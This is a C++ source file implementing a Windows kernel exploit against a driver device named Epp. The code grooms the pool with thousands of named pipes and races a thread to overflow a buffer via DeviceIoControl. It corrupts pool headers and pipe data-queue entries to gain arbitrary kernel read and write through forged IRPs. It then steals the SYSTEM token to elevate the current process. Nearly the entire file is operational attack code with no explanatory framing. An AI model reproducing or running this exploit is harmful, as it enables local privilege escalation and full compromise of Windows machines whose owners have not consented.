#include "Epp.h"
#include <iostream>
#include <thread>
#include <chrono>
#include "Utils.h"
#include "NtoskrnlOffsetFinder.h"

#pragma comment( lib, "ntdll.lib" )

Epp::Epp()
{
    HANDLE DevHandle = CreateFileW(L"\\\\.\\Epp", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if (DevHandle == INVALID_HANDLE_VALUE)
    {
        std::cout << "Failed to open a device, last error: " << std::dec << GetLastError() << std::endl;
        return;
    }

    DeviceHandle = DevHandle;

    if (!SetupArbitraryRead())
    {
        std::cout << "Failed to setup arbitrary read" << std::endl;
        return;
    }

    if (!SetupArbitraryWrite())
    {
        std::cout << "Failed to setup arbitrary write" << std::endl;
        return;
    }
}

bool Epp::SetupArbitraryRead()
{
    if (IsArbitraryReadSetupped)
    {
        return true;
    }

    const UINT64 NamedPipesCount = 10000;
    const UINT64 PipeBufferSize = 0x80;
    HANDLE* NamedPipes = (HANDLE*)malloc(NamedPipesCount * sizeof(HANDLE));
    HANDLE* NamedPipesClients = (HANDLE*)malloc(NamedPipesCount * sizeof(HANDLE));

    //Buffer which will be written to named pipes
    BYTE* BufferToWrite = (BYTE*)malloc(PipeBufferSize);
    memset(BufferToWrite, 'A', PipeBufferSize);

    for (unsigned int i = 0; i < NamedPipesCount; i++)
    {
        NamedPipes[i] = CreateNamedPipeW(L"\\\\.\\pipe\\1234",
            PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
            PIPE_TYPE_BYTE | PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES,
            PipeBufferSize,
            PipeBufferSize,
            0,
            0);
        if (NamedPipes[i] == INVALID_HANDLE_VALUE)
        {
            std::cout << "Failed to create named pipe :(" << std::endl;
            continue;
        }

        NamedPipesClients[i] = CreateFileW(L"\\\\.\\pipe\\1234", GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
        if (NamedPipesClients[i] == INVALID_HANDLE_VALUE)
        {
            std::cout << "Failed to connect to named pipe :(" << std::endl;
        }

        DWORD BytesWritten = 0;
        bool Result = WriteFile(NamedPipes[i], BufferToWrite, PipeBufferSize, &BytesWritten, 0);
        if (!Result)
        {
            std::cout << "Failed to write to named pipe :(" << std::endl;
        }
    }

    free(BufferToWrite);
    BufferToWrite = nullptr;

    //free some data queue entries
    for (unsigned int i = 0; i < NamedPipesCount; i += 5)
    {
        CloseHandle(NamedPipesClients[i]);
        NamedPipesClients[i] = INVALID_HANDLE_VALUE;
        CloseHandle(NamedPipes[i]);
        NamedPipes[i] = INVALID_HANDLE_VALUE;
    }

    PPEB Peb = GetCurrentProcessPEB();
    _RTL_USER_PROCESS_PARAMETERS2* ProcessParameters = (_RTL_USER_PROCESS_PARAMETERS2*)Peb->ProcessParameters;
    wchar_t* CommandLine = (wchar_t*)malloc(0x8);
    wcscpy_s(CommandLine, 4, L"123");
    ProcessParameters->CommandLine.Length = 8;
    ProcessParameters->CommandLine.Buffer = CommandLine;

    const SIZE_T DosPathSize = 0x10,
        const DosPathOverflowSize = 0x80 + sizeof(POOL_HEADER) + sizeof(void*);
    BYTE* DosPath = (BYTE*)malloc(DosPathOverflowSize);
    ZeroMemory(DosPath, DosPathOverflowSize);
    POOL_HEADER* CorruptedPoolHeader = (POOL_HEADER*)(DosPath + 0x80);
    CorruptedPoolHeader->BlockSize = (PipeBufferSize + sizeof(POOL_HEADER) + sizeof(DATA_QUEUE_ENTRY)) >> 4;
    CorruptedPoolHeader->PoolTag = 'NpFr';

    DATA_QUEUE_ENTRY* DataQueueEntry = (DATA_QUEUE_ENTRY*)malloc(sizeof(DATA_QUEUE_ENTRY) + 0x100);
    ZeroMemory(DataQueueEntry, sizeof(DATA_QUEUE_ENTRY) + 0x100);
    DataQueueEntry->DataSize = sizeof(DWORD);
    DataQueueEntry->EntryType = 1;

    DWORD ValueToRead = 0x12345678;
    IRP* Irp = (IRP*)malloc(sizeof(IRP));
    ZeroMemory(Irp, sizeof(IRP));
    Irp->AssociatedIrp.SystemBuffer = &ValueToRead;
    DataQueueEntry->Irp = Irp;

    *(void**)(DosPath + 0x80 + sizeof(POOL_HEADER)) = DataQueueEntry;

    ProcessParameters->CurrentDirectory.DosPath.Length = DosPathSize;
    ProcessParameters->CurrentDirectory.DosPath.Buffer = (wchar_t*)DosPath;

    XorParams* Parameters = (XorParams*)malloc(sizeof(XorParams));
    Parameters->AddressToXor = &ProcessParameters->CurrentDirectory.DosPath.Length;
    Parameters->ValueToXor = DosPathSize ^ DosPathOverflowSize;

    HANDLE XoringThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)XorWord, Parameters, 0, 0);
    if (XoringThread == NULL)
    {
        std::cout << "Failed to create xoring thread, last error: " << std::dec << GetLastError() << std::endl;
        return false;
    }

    DWORD CurrentPid = GetCurrentProcessId();
    SIZE_T OutputBufferSize = 0x70,
        RealOutputBufferSize = OutputBufferSize * 0x10;
    BYTE* OutputBuffer = (BYTE*)malloc(RealOutputBufferSize);
    ZeroMemory(OutputBuffer, RealOutputBufferSize);

    DWORD Returned = 0, BytesRead = 0;
    bool IsOverflownPipeFound = false;
    BYTE* ReadedFromPipe = (BYTE*)malloc(PipeBufferSize + sizeof(DWORD));
    unsigned int IndexOfOverflowedPipe = 0;

    std::cout << "Trying to trigger buffer overflow to achieve arbitrary read..." << std::endl;

    for (unsigned int i = 0; true; i++)
    {
        DeviceIoControl(DeviceHandle, 0x22240C, &CurrentPid, sizeof(CurrentPid), OutputBuffer, OutputBufferSize, &Returned, 0);
        for (unsigned int j = 0; j < NamedPipesCount; j++)
        {
            if (NamedPipes[j] != INVALID_HANDLE_VALUE
                && NamedPipesClients[j] != INVALID_HANDLE_VALUE)
            {
                PeekNamedPipe(NamedPipesClients[j], ReadedFromPipe, PipeBufferSize + sizeof(ValueToRead), &BytesRead, 0, 0);
                if (BytesRead == PipeBufferSize + sizeof(ValueToRead))
                {
                    if (*(DWORD*)(ReadedFromPipe + PipeBufferSize) == ValueToRead)
                    {
                        IndexOfOverflowedPipe = j;
                        IsOverflownPipeFound = true;
                        break;
                    }
                    std::cout << "Read some invalid data, bsod should occur ;(" << std::endl;
                }
            }
        }
        if (IsOverflownPipeFound)
        {
            std::cout << "Buffer overflow triggered after " << std::dec << i << " iterations" << std::endl;
            break;
        }
    }

    if (!TerminateThread(XoringThread, 0))
    {
        std::cout << "Failed to terminate xoring thread, last error: " << std::dec << GetLastError() << std::endl;
    }
    else
    {
        free(Parameters);
        Parameters = nullptr;
    }

    free(OutputBuffer);
    OutputBuffer = nullptr;

    ProcessParameters->CurrentDirectory.DosPath.Buffer = nullptr;
    free(DosPath);
    DosPath = nullptr;
    
    VulnerablePipe = NamedPipesClients[IndexOfOverflowedPipe];
    OffsetOfData = PipeBufferSize;

    IsArbitraryReadSetupped = true;
    ArbitraryReadIrp = Irp;
    UserDataQueue = DataQueueEntry;

    //Free named pipes which were used to spray heap
    for (unsigned int i = 0; i < NamedPipesCount; i++)
    {
        if (i == IndexOfOverflowedPipe)
        {
            continue;
        }
        if (NamedPipesClients[i] != INVALID_HANDLE_VALUE)
        {
            CloseHandle(NamedPipesClients[i]);
        }
        if (NamedPipes[i] != INVALID_HANDLE_VALUE)
        {
            CloseHandle(NamedPipes[i]);
        }
    }

    free(NamedPipes);
    free(NamedPipesClients);

    free(ReadedFromPipe);

    return true;
}

bool Epp::ArbitraryRead(void* AddressToReadFrom, void* Destination, UINT64 BytesToRead)
{
    if (!IsArbitraryReadSetupped)
    {
        return false;
    }
    ZeroMemory(UserDataQueue, sizeof(DATA_QUEUE_ENTRY));
    UserDataQueue->NextEntry.Flink = ListEntryOfUserDataQueue.Flink;
    UserDataQueue->NextEntry.Blink = ListEntryOfUserDataQueue.Blink;
    UserDataQueue->QuotaInEntry = 0;
    UserDataQueue->Irp = ArbitraryReadIrp;
    UserDataQueue->DataSize = BytesToRead + 1;
    UserDataQueue->EntryType = 1;
    ArbitraryReadIrp->AssociatedIrp.SystemBuffer = AddressToReadFrom;
    BYTE* Buffer = (BYTE*)malloc(OffsetOfData + BytesToRead);
    ZeroMemory(Buffer, OffsetOfData + BytesToRead);
    DWORD ReadBytes = 0;
    PeekNamedPipe(VulnerablePipe, Buffer, OffsetOfData + BytesToRead, &ReadBytes, 0, 0);
    if (OffsetOfData + BytesToRead != ReadBytes)
    {
        std::cout << "Arbitrary read probably failed, read 0x"
            << std::hex << ReadBytes << " instead of 0x"
            << OffsetOfData + BytesToRead << " bytes" << std::endl;
    }
    memcpy(Destination, Buffer + OffsetOfData, BytesToRead);
    free(Buffer);
    return true;
}

bool Epp::SetupArbitraryWrite()
{
    if (IsArbitraryWriteSetupped)
    {
        return true;
    }
    if (!IsArbitraryReadSetupped)
    {
        return false;
    }

    const UINT64 NamedPipesCount = 15000;
    const UINT64 PipeBufferSize = 0x40; 
    HANDLE* NamedPipes = (HANDLE*)malloc(NamedPipesCount * sizeof(HANDLE));
    HANDLE* NamedPipesClients = (HANDLE*)malloc(NamedPipesCount * sizeof(HANDLE));

    //Buffer which will be written to named pipes
    BYTE* BufferToWrite = (BYTE*)malloc(PipeBufferSize);
    memset(BufferToWrite, 'A', PipeBufferSize);

    for (unsigned int i = 0; i < NamedPipesCount; i++)
    {
        NamedPipes[i] = CreateNamedPipeW(L"\\\\.\\pipe\\1234",
            PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
            PIPE_TYPE_BYTE | PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES,
            PipeBufferSize,
            PipeBufferSize,
            0,
            0);
        if (NamedPipes[i] == INVALID_HANDLE_VALUE)
        {
            std::cout << "Failed to create named pipe :(" << std::endl;
            continue;
        }

        NamedPipesClients[i] = CreateFileW(L"\\\\.\\pipe\\1234", GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
        if (NamedPipesClients[i] == INVALID_HANDLE_VALUE)
        {
            std::cout << "Failed to connect to named pipe :(" << std::endl;
        }

        DWORD BytesWritten = 0;
        *(unsigned int*)BufferToWrite = i;
        bool Result = WriteFile(NamedPipes[i], BufferToWrite, PipeBufferSize, &BytesWritten, 0);
        if (!Result)
        {
            std::cout << "Failed to write to named pipe :(" << std::endl;
        }
    }

    for (unsigned int i = 0; i < NamedPipesCount; i += 25)
    {
        CloseHandle(NamedPipesClients[i]);
        NamedPipesClients[i] = INVALID_HANDLE_VALUE;
        CloseHandle(NamedPipes[i]);
        NamedPipes[i] = INVALID_HANDLE_VALUE;
    }

    SIZE_T DosPathSize = 0x10,
        DosPathOverflowSize = 0x30 + sizeof(POOL_HEADER) + sizeof(DATA_QUEUE_ENTRY);
    BYTE* DosPath = (BYTE*)malloc(DosPathOverflowSize);
    ZeroMemory(DosPath, DosPathOverflowSize);
    POOL_HEADER* CorruptedPoolHeader = (POOL_HEADER*)(DosPath + 0x30);
    CorruptedPoolHeader->BlockSize = (PipeBufferSize + sizeof(POOL_HEADER) + sizeof(DATA_QUEUE_ENTRY)) >> 4;
    CorruptedPoolHeader->PoolTag = 'NpFr';
    DATA_QUEUE_ENTRY* CorruptedDataQueueEntry = (DATA_QUEUE_ENTRY*)(DosPath + 0x30 + sizeof(POOL_HEADER));
    DWORD OverflowToReadSize = PipeBufferSize + sizeof(POOL_HEADER) + sizeof(DATA_QUEUE_ENTRY) + sizeof(unsigned int);
    CorruptedDataQueueEntry->DataSize = OverflowToReadSize;
    CorruptedDataQueueEntry->EntryType = 0;
    CorruptedDataQueueEntry->Irp = 0;
    CorruptedDataQueueEntry->QuotaInEntry = CorruptedDataQueueEntry->DataSize;

    PPEB Peb = GetCurrentProcessPEB();
    _RTL_USER_PROCESS_PARAMETERS2* ProcessParameters = (_RTL_USER_PROCESS_PARAMETERS2*)Peb->ProcessParameters;
    ProcessParameters->CurrentDirectory.DosPath.Buffer = (wchar_t*)DosPath;
    ProcessParameters->CurrentDirectory.DosPath.Length = DosPathSize;

    XorParams* Parameters = (XorParams*)malloc(sizeof(XorParams));
    Parameters->AddressToXor = &ProcessParameters->CurrentDirectory.DosPath.Length;
    Parameters->ValueToXor = DosPathSize ^ DosPathOverflowSize;

    HANDLE XoringThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)XorWord, Parameters, 0, 0);
    if (XoringThread == NULL)
    {
        std::cout << "Failed to create xoring thread, last error: " << std::dec << GetLastError() << std::endl;
        return false;
    }

    DWORD CurrentPid = GetCurrentProcessId();
    const SIZE_T OutputBufferSize = 0x30,
        const RealOutputBufferSize = OutputBufferSize * 0x10;
    BYTE* OutputBuffer = (BYTE*)malloc(RealOutputBufferSize);
    ZeroMemory(OutputBuffer, RealOutputBufferSize);

    DWORD BytesRead = 0, 
        Returned = 0;
    BYTE* ReadFromNamedPipe = (BYTE*)malloc(OverflowToReadSize);
    ZeroMemory(ReadFromNamedPipe, OverflowToReadSize);

    bool IsOverflownPipeFound = false;
    unsigned int IndexOfOverflowedPipe = 0;

    std::cout << "Trying to trigger buffer overflow for arbitrary write..." << std::endl;
    for (unsigned int i = 0; true; i++)
    {
        DeviceIoControl(DeviceHandle, 0x22240C, &CurrentPid, sizeof(CurrentPid), OutputBuffer, OutputBufferSize, &Returned, 0);
        for (unsigned int j = 0; j < NamedPipesCount; j++)
        {
            if (NamedPipes[j] != INVALID_HANDLE_VALUE
                && NamedPipesClients[j] != INVALID_HANDLE_VALUE)
            {
                PeekNamedPipe(NamedPipesClients[j], ReadFromNamedPipe, OverflowToReadSize, &BytesRead, 0, 0);
                if (BytesRead != PipeBufferSize)
                {
                    if (BytesRead == OverflowToReadSize)
                    {
                        IndexOfOverflowedPipe = j;
                        IsOverflownPipeFound = true;
                        break;
                    }
                    std::cout << "Bsod is coming ;o" << std::endl;
                }
            }
        }
        if (IsOverflownPipeFound)
        {
            std::cout << "Buffer overflow triggered after " << std::dec << i << " iterations" << std::endl;
            break;
        }
    }

    if (!TerminateThread(XoringThread, 0))
    {
        std::cout << "Failed to terminate xoring thread, last error: " << std::dec << GetLastError() << std::endl;
    }
    else
    {
        free(Parameters);
        Parameters = nullptr;
    }

    free(OutputBuffer);
    OutputBuffer = nullptr;

    ProcessParameters->CurrentDirectory.DosPath.Buffer = nullptr;
    free(DosPath);
    DosPath = nullptr;

    DATA_QUEUE_ENTRY* ReadDataQueue = (DATA_QUEUE_ENTRY*)(ReadFromNamedPipe + PipeBufferSize + sizeof(POOL_HEADER));
    unsigned int IndexOfPipeWithForgedIrps = *(unsigned int*)(ReadFromNamedPipe + PipeBufferSize + sizeof(POOL_HEADER) + sizeof(DATA_QUEUE_ENTRY));
    if (NamedPipes[IndexOfPipeWithForgedIrps] == INVALID_HANDLE_VALUE
        || NamedPipesClients[IndexOfPipeWithForgedIrps] == INVALID_HANDLE_VALUE)
    {
        std::cout << "Pipe which should have hold forged irps is already freed" << std::endl;
        std::cout << "Bsod will occur in a moment :c" << std::endl;
        return false;
    }
    std::cout << "Index of pipe which should hold forged irps: " << std::dec << IndexOfPipeWithForgedIrps << std::endl;

    PipeWithForgedIrps = NamedPipes[IndexOfPipeWithForgedIrps];

    //Address of data queue entry which belongs to pipe with forged irps
    void* AddressOfVulnerableDataQueueEntry,
        * Ccb;
    ArbitraryRead(ReadDataQueue->NextEntry.Blink, &AddressOfVulnerableDataQueueEntry, sizeof(void*));
    std::cout << "Address of data queue entry which belongs to pipe with forged irps: 0x" << std::hex << AddressOfVulnerableDataQueueEntry << std::endl;
    Ccb = (BYTE*)ReadDataQueue->NextEntry.Blink - 0xA8; //0xA8 of offset of data queue entry linked list in ccb

    CcbWithForgedIrps = Ccb;

    NTFSCONTROLFILE NtFsControlFile = (NTFSCONTROLFILE)GetProcAddress(LoadLibraryW(L"ntdll.dll"), "NtFsControlFile");
    IO_STATUS_BLOCK StatusBlock;
    NTSTATUS Status = NtFsControlFile(NamedPipes[IndexOfPipeWithForgedIrps], 0, 0, 0, &StatusBlock, 0x119FF8, BufferToWrite, PipeBufferSize, 0, 0);
    std::cout << "NtFsControlFile returned: 0x" << std::hex << Status << std::endl;
    std::this_thread::sleep_for(std::chrono::milliseconds(100));
    LIST_ENTRY ListEntry;
    ArbitraryRead(AddressOfVulnerableDataQueueEntry, &ListEntry, sizeof(LIST_ENTRY));
    DATA_QUEUE_ENTRY DataQueueWithIrp;
    ArbitraryRead(ListEntry.Flink, &DataQueueWithIrp, sizeof(DATA_QUEUE_ENTRY));

    std::cout << "Irp to forge: 0x" << DataQueueWithIrp.Irp << std::endl;

    SizeOfForgedIrp = sizeof(IRP) + 0x200;
    ForgedIrp = (IRP*)malloc(SizeOfForgedIrp);
    ZeroMemory(ForgedIrp, SizeOfForgedIrp);
    ArbitraryRead(DataQueueWithIrp.Irp, ForgedIrp, SizeOfForgedIrp);

    void* IrpEprocess = nullptr;
    ArbitraryRead(((BYTE*)ForgedIrp->ThreadListEntry.Flink - OffsetFinder.GetIrpListOffset() + OffsetFinder.GetProcessOffset()), &IrpEprocess, sizeof(void*));
    std::cout << "Some Eprocess address: 0x" << std::hex << IrpEprocess << std::endl;
    SomeEprocess = IrpEprocess;

    const ULONG IRP_BUFFERED_IO = 0x10,
        const IRP_DEALLOCATE_BUFFER = 0x20,
        const IRP_INPUT_OPERATION = 0x40;
    ForgedIrp->Flags |= IRP_BUFFERED_IO | IRP_INPUT_OPERATION;
    ForgedIrp->Flags &= ~IRP_DEALLOCATE_BUFFER;

    void* CcbOfUserDataQueue,
        * BlinkOfUserDataQueue;
    FindCcbWithDataQueue(Ccb, UserDataQueue, &CcbOfUserDataQueue, &BlinkOfUserDataQueue);
    ListEntryOfUserDataQueue.Flink = (LIST_ENTRY*)((BYTE*)CcbOfUserDataQueue + 0xA8);
    ListEntryOfUserDataQueue.Blink = (LIST_ENTRY*)BlinkOfUserDataQueue;
    std::cout << "BlinkOfUserDataQueue: 0x" << std::hex << BlinkOfUserDataQueue << std::endl;

    IsArbitraryWriteSetupped = true;
    
    for (unsigned int i = 0; i < NamedPipesCount; i++)
    {
        if (i == IndexOfOverflowedPipe ||
            i == IndexOfPipeWithForgedIrps)
        {
            continue;
        }
        if (NamedPipes[i] != INVALID_HANDLE_VALUE)
        {
            CloseHandle(NamedPipes[i]);
        }
        if (NamedPipesClients[i] != INVALID_HANDLE_VALUE)
        {
            CloseHandle(NamedPipesClients[i]);
        }
    }

    free(NamedPipes);
    free(NamedPipesClients);

    free(ReadFromNamedPipe);

    free(BufferToWrite);

    return true;
}

bool Epp::ArbitraryWrite(void* AddressToWrite, void* Source, UINT64 BytesToWrite)
{
    if (!IsArbitraryReadSetupped || !IsArbitraryWriteSetupped)
    {
        return false;
    }

    LIST_ENTRY ThreadList{ 0 };

    ForgedIrp->UserBuffer = AddressToWrite;
    ForgedIrp->AssociatedIrp.SystemBuffer = Source;
    ForgedIrp->ThreadListEntry.Flink = &ThreadList;
    ForgedIrp->ThreadListEntry.Blink = &ThreadList;

    NTFSCONTROLFILE NtFsControlFile = (NTFSCONTROLFILE)GetProcAddress(LoadLibraryW(L"ntdll.dll"), "NtFsControlFile");
    IO_STATUS_BLOCK StatusBlock;
    NtFsControlFile(PipeWithForgedIrps, 0, 0, 0, &StatusBlock, 0x119FF8, ForgedIrp, SizeOfForgedIrp, 0, 0);
    std::this_thread::sleep_for(std::chrono::milliseconds(100));

    void* DataQueueWithForgedIrp;
    ArbitraryRead((BYTE*)CcbWithForgedIrps + 0xB0, &DataQueueWithForgedIrp, sizeof(void*));
    std::cout << "Data queue entry with forged irp: 0x" << std::hex << DataQueueWithForgedIrp << std::endl;
    void* IrpAddress;
    ArbitraryRead((BYTE*)DataQueueWithForgedIrp + offsetof(DATA_QUEUE_ENTRY, Irp), &IrpAddress, sizeof(void*));
    std::cout << "Irp which holds forged irp: 0x" << std::hex << IrpAddress << std::endl;
    void* ForgedIrpAddress;
    ArbitraryRead((BYTE*)IrpAddress + offsetof(IRP, AssociatedIrp.SystemBuffer), &ForgedIrpAddress, sizeof(void*));
    std::cout << "Forged irp address: 0x" << std::hex << ForgedIrpAddress << std::endl;

    ThreadList.Flink = (LIST_ENTRY*)((BYTE*)ForgedIrpAddress + offsetof(IRP, ThreadListEntry));
    ThreadList.Blink = (LIST_ENTRY*)((BYTE*)ForgedIrpAddress + offsetof(IRP, ThreadListEntry));

    ZeroMemory(UserDataQueue, sizeof(DATA_QUEUE_ENTRY));
    UserDataQueue->EntryType = 0;
    UserDataQueue->NextEntry.Flink = ListEntryOfUserDataQueue.Flink;
    UserDataQueue->NextEntry.Blink = ListEntryOfUserDataQueue.Blink;
    UserDataQueue->QuotaInEntry = BytesToWrite - 1;
    UserDataQueue->DataSize = BytesToWrite;
    UserDataQueue->Irp = ForgedIrpAddress;

    BYTE Output;
    DWORD BytesRead;
    bool Result = ReadFile(VulnerablePipe, &Output, sizeof(Output), &BytesRead, 0);
    std::cout << "ReadFile returned: " << Result << std::endl;
    OffsetOfData--;
    return true;
}

void* Epp::GetEprocessAddressByPid(DWORD ProcessId)
{
    if (SomeEprocess == nullptr)
    {
        return nullptr;
    }

    void* i = SomeEprocess;
    bool IsProcessFound = false;
    do
    {
        void* Pid;
        ArbitraryRead((void*)((UINT64)i + OffsetFinder.GetUniqueProcessIdOffset()), &Pid, sizeof(void*));
        if ((DWORD)Pid == ProcessId)
        {
            IsProcessFound = true;
            break;
        }
        void* NextProcessAddress;
        ArbitraryRead((void*)((UINT64)i + OffsetFinder.GetActiveProcessLinksOffset()), &NextProcessAddress, sizeof(void*));
        NextProcessAddress = (void*)((UINT64)NextProcessAddress - OffsetFinder.GetActiveProcessLinksOffset());
        i = NextProcessAddress;
    } while (i != SomeEprocess);

    if (!IsProcessFound)
    {
        return nullptr;
    }
    return i;
}

const bool Epp::GetIsSetupped()
{
    return IsArbitraryReadSetupped && IsArbitraryWriteSetupped;
}

bool Epp::ElevatePrivileges()
{
    if (!IsArbitraryReadSetupped
        || !IsArbitraryWriteSetupped)
    {
        return false;
    }

    void* CurrentEprocess = GetEprocessAddressByPid(GetCurrentProcessId());
    if (CurrentEprocess == nullptr)
    {
        std::cout << "Failed to find current Eprocess" << std::endl;
        return false;
    }
    std::cout << "Current Eprocess: 0x" << std::hex << CurrentEprocess << std::endl;

    void* SystemEprocess = GetEprocessAddressByPid(4);
    if (SystemEprocess == nullptr)
    {
        std::cout << "Failed to find system Eprocess" << std::endl;
        return false;
    }
    std::cout << "System Eprocess: 0x" << std::hex << SystemEprocess << std::endl;

    void* CurrentEprocessToken = nullptr;
    ArbitraryRead((BYTE*)CurrentEprocess + OffsetFinder.GetTokenOffset(), &CurrentEprocessToken, sizeof(void*));
    std::cout << "Current Eprocess token: 0x" << std::hex << CurrentEprocessToken << std::endl;

    void* SystemEprocessToken = nullptr;
    ArbitraryRead((BYTE*)SystemEprocess + OffsetFinder.GetTokenOffset(), &SystemEprocessToken, sizeof(void*));
    std::cout << "System Eprocess token: 0x" << std::hex << SystemEprocessToken << std::endl;

    void* TokenToOverwrite = (void*)(((UINT64)CurrentEprocessToken) & 0xF);
    TokenToOverwrite = (void*)((UINT64)TokenToOverwrite | ((UINT64)SystemEprocessToken & ~0xF));

    std::cout << "Token to overwrite: 0x" << std::hex << TokenToOverwrite << std::endl;
    
    ArbitraryWrite((BYTE*)CurrentEprocess + OffsetFinder.GetTokenOffset(), &TokenToOverwrite, sizeof(void*));

    return true;
}

void Epp::FindCcbWithDataQueue(void* Ccb, void* FlinkOfFirstDataQueue, void** OutCcb, void** OutDataQueueEntry)
{
    bool IsCcbFound = false;
    void* CurrentCcb;
    void* CcbFlink = (BYTE*)Ccb + 0x18; //Flink to next ccb
    void* ResultCcb = nullptr,
        * ResultDataQueueEntry = nullptr;
    for (unsigned int i = 0; i < 1000000; i++)
    {
        if (!CcbFlink)
        {
            break;
        }
        //std::cout << "CcbFlink: 0x" << std::hex << CcbFlink << std::endl;
        ArbitraryRead(CcbFlink, &CurrentCcb, sizeof(void*));
        void* DataQueue = nullptr;
        ArbitraryRead((BYTE*)CurrentCcb + 0x90, &DataQueue, sizeof(void*));
        if (DataQueue == nullptr)
        {
            CcbFlink = CurrentCcb;
            continue;
        }
        //std::cout << "DataQueue: 0x" << std::hex << DataQueue << std::endl;
        void* NextDataQueue;
        ArbitraryRead(DataQueue, &NextDataQueue, sizeof(void*));
        //std::cout << "NextDataQueue: 0x" << std::hex << NextDataQueue << std::endl;
        if (NextDataQueue == FlinkOfFirstDataQueue)
        {
            std::cout << "Ccb found after " << std::dec << i << " iterations" << std::endl;
            ResultCcb = (BYTE*)CurrentCcb + 0x90;
            ResultDataQueueEntry = DataQueue;
            IsCcbFound = true;
            break;
        }
        CcbFlink = CurrentCcb;
    }
    if (!IsCcbFound)
    {
        std::cout << "Failed to find ccb :(" << std::endl;
        *OutCcb = nullptr;
        *OutDataQueueEntry = nullptr;
        return;
    }
    if (OutCcb)
    {
        *OutCcb = (BYTE*)ResultCcb - 0xA8;
    }
    if (OutDataQueueEntry)
    {
        *OutDataQueueEntry = ResultDataQueueEntry;
    }
}